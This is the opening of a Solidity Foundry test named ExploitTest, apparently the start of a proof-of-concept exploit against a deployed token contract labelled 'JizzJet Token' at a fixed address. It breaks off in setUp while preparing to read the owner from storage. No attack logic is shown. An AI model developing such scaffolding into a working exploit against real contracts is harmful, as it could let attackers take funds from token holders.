contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF2A7429641d1b49a13dCB7E23b67a1a5101231F2;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for this demonstration
        vm.label(TARGET, "JizzJet Token");

        // We need to interact with the token contract
        IJizzJet token = IJizzJet(TARGET);

        // Get the owner address from storage (slot 0 for Ownable)
